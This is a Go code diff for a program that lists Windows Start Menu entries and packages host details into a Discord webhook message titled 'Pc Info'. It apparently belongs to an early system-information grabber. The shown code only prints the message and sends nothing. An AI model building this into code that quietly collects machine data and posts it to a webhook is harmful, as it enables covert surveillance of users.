@@ -2,25 +2,21 @@ package main
 
 import (
 	"encoding/json"
+	"os"
 	"strconv"
 	"strings"
 )
 
 func main() {
-	//output, err := getChromeVersion()
-	//if err != nil {
-	//	println(err.Error())
-	//}
-	//println(output)
-	//println(appdataPath())
-	//out, _ := os.ReadDir(startMenuPath())
-	//sb := strings.Builder{}
-	//for _, e := range out {
-	//	sb.WriteString(e.Name())
-	//	sb.WriteString("\n")
-	//}
-	embed := Embed{"fasdf", "asdfff", "", Footer{}}
+	out, _ := os.ReadDir(startMenuPath())
+	sb := strings.Builder{}
+	for _, e := range out {
+		sb.WriteString(e.Name())
+		sb.WriteString("\n")
+	}
 
+	embed := Embed{"Pc Info", makeWebhookString(), "", Footer{}}
+	//embed2 := Embed{"Apps Info", sb.String(), "", Footer{}}
 	embeds := Embeds{embeds: []Embed{embed}}
 	dm := DiscordMessage{"Why tho", embeds, Footer{}, Author{}}
 	println(dm.String())
